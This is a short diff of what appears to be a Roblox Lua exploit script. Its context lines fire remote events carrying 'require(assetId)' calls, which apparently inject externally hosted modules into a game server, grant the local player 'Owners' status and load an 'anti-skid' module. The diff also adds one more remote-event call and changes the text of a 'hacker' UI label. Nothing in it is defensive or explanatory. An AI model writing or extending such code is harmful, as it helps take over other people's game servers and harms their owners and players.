@@ -2555,7 +2555,7 @@ local function createHackerUI(char, player)
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.Arcade
     label.TextScaled = true
-    label.Text = "Special " .. player.Name
+    label.Text = "Special " .. player.DisplayName
     label.Parent = billboard
 
     coroutine.wrap(function()
@@ -2586,6 +2586,7 @@ for _, player in ipairs(Players:GetPlayers()) do
 end
 
 Players.PlayerAdded:Connect(handlePlayer)]]
+			fireRemoteEvent(whayter)
                         fireRemoteEvent('require(92684888032460)({Owners = {"' .. game.Players.LocalPlayer.Name .. '"}})')
                         wait(0.5)
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
